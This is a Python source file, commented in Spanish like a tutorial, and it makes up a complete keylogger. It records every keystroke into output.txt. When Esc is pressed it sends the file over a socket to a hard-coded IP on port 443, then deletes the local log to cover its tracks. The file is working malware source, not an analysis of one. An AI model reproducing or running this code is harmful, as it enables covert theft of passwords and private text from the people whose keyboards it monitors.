import keyboard #tomar los evento del teclado
import sys
import socket # para eviar fichero por la red
import os # para interactura con el sistema operativo

palabra ="" # almacena la palabra completa

def pulsacion_tecla(pulsacion):
    #print(pulsacion)
    global palabra # para utilizar la variable fuera de la función
    if pulsacion.event_type==keyboard.KEY_DOWN:# validamos si hay una pulsacion de tecla
        # si en la pulsacion hay un espacion quiere decir que sea completado una palabra
        if pulsacion.name =='space' or pulsacion.name=='enter':
            guardar_palabra()
        elif len(pulsacion.name)==1 and pulsacion.name.isprintable(): # validamos si la pulsacion es un caracterer
            palabra+=pulsacion.name # insetamos cada letra en la variable palabra

    

keyboard.hook(pulsacion_tecla)# cada pulsacion se va enviar a la variable pulsacion

def guardar_palabra():
    print(f'ingresa a almacenar {palabra}')
    with open ('output.txt','a')as file:
        file.write(palabra +'\n') #como la variable "palabra" es global, se almacena con un salto de linea

    print(f'palabra registrada {palabra}')

    resetear_palabra()# una vez almacenado la palabra 

def resetear_palabra():
    global palabra
    palabra =""


def enviar_archivo_via_socker(archivo_enviar,direccion_ip_destino,pueto_destino):
    try:
        with open(archivo_enviar,'rb')as file:
            contenido= file.read()
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as conexion:
            conexion.connect((direccion_ip_destino,pueto_destino))
            conexion.sendall(contenido)
            os.remove("output.txt")
            sys.exit()
    except Exception as e:
        print(f'hubo un error {e} ')
def detener_sript():
    print('detenemos el script y enviamos los datos')
    #keyboard.hook_all()# desvinculamos las teclas 
    enviar_archivo_via_socker(archivo_enviar,direccion_ip_destino,pueto_destino)



direccion_ip_destino= '192.168.0.9'
pueto_destino= 443
archivo_enviar="output.txt"

try:
    # necesitamos un bucle esdecir que keyboard es escuchando hasta que se presione el esc
    keyboard.wait("esc")
    detener_sript()
except KeyboardInterrupt:# en caso de que interumpir con control + C
    print("script detenido")
    pass






"""
El método isprintable() es un método de cadena (string) en Python que retorna True si todos los caracteres en la cadena son imprimibles, 
es decir, si la cadena no contiene ningún carácter de control o no imprimible.
Sin embargo, si tienes una cadena que contiene caracteres no imprimibles, como por ejemplo: texto = "Hola\nMundo!"
 la cadena contiene un carácter de nueva línea (\n), que no es imprimible, por lo que isprintable() devuelve False.
"""

